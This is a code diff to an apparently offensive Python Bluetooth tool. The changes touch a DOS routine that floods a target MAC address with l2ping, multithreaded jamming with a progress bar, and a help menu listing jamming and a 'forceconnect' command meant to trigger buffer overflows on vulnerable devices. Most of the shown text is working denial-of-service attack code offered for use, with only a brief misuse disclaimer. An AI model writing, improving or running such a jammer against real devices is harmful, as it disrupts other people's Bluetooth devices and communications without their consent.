@@ -18,7 +18,8 @@ print("I am not responsible for any damages or misuse from this software.\nThis 
 
 
 def DOS(target, packetsize):
-    os.system('l2ping -i hci0 -s ' + str(packetsize) +' -f ' + target)
+    subprocess.call(["l2ping", "-i", "hci0", "-s", str(packetsize), "-f", target], stdout=open(os.devnull, 'wb'))
+    
 
 
 
@@ -65,7 +66,7 @@ def force_connect(target):
 
 def jam(threads_count, packetsize):
    
-    print("\x1b[31m[*] Starting DOS attack in 3 seconds...")
+    print("[*] Starting DOS attack in 3 seconds...")
 
     for i in range(0, 3):
         print('[*] ' + str(3 - i))
@@ -73,14 +74,16 @@ def jam(threads_count, packetsize):
     os.system('clear')
 
     print("Building Threads")
-    for i in range(0, int(threads_count)):
+    with alive_bar(int(threads_count)) as bar:
+        for i in range(0, int(threads_count)):
          
-        print('[*] Built thread №' + str(i + 1))
-        threading.Thread(target=DOS, args=[str(target), str(packetsize)]).start()
-
+            threading.Thread(target=DOS, args=[str(target), str(packetsize)]).start()
+            bar()
     
+
     print('[*] Built all threads...')
     print('[*] Starting...')
+    
     
 def help_menu():
     print(" \n")
@@ -90,11 +93,11 @@ def help_menu():
     print("jam                          ---  jams devices using specified interface, target, and packet size")
     print("forceconnect                 ---  tries to cause a buffer overflow connection on vulnerable devices")
     print("set target <target>          ---  sets target MAC address for later use")
+    print("show blocked                 ---  shows all MAC addresses and hostnames jammed")
     print("set interface <interface>    ---  sets bluetooth interface for use")
     print("set packetsize <packet size> ---  sets packet size for use with the \"jam\" command (in bytes)")
     print("set threads <thread number>  ---  sets number of threads for attack")
     print("clear                        ---  clears terminal window")
-    print("jamall                       ---  jam all devices as soon as detecting")
     print(" ")
 
 
